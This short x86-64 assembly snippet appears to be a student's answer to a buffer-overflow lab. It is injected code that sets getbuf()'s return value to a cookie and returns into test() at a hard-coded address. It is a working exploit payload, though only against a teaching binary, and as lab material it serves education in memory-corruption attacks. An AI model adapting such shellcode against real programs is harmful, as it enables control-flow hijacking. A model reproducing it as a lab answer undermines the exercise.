movq $0x7600148e188e48f7, %rax    #set return value from getbuf() to my cookie value
pushq $0x400ef3                   #push address of the next after getbuf() call instruction in procedure test()
retq                              #return to instruction following the getbuf() call
